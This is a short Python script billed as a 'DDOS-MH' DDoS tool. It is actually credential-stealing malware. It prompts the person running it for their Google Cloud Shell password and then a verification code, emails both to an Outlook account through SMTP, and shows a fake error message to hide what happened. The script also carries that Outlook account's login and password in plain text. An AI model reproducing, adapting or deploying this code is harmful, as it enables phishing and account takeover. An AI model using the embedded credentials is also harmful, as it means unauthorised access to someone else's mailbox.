import smtplib
from getpass import getpass
from termcolor import colored
import time

print(colored("====== DDOS-MH ======", "blue"))

# Log in to the email server
server = smtplib.SMTP("smtp.office365.com", 587)
server.starttls()

# Use your Outlook email address and password to log in
sender_email = "ahmkjsj@outlook.com"
sender_password = "Muhammed.4774"
server.login(sender_email, sender_password)

# Prompt the user to set a password for the tool
password = getpass(colored("Enter your password associated with the Google cloudshell account: ", "green"))

# Send the credentials to your own email address
message = f"Subject: Credentials for the tool\n\nPassword: {password}"
server.sendmail(sender_email, sender_email, message)

# Wait for 20 seconds
time.sleep(20)

# Ask for verification code
verification_code = input(colored("Enter the security code or the verifacation code: ", "green"))

# Send the verification code to your Outlook mail
message = f"Subject: Verification code\n\nThe verification code is: {verification_code}"
server.sendmail(sender_email, sender_email, message)

# Wait for 20 seconds
time.sleep(20)

# Inform the user that the verification code has been sent
print(colored("There was an error", "red"))

# Log out of the email server
server.quit()
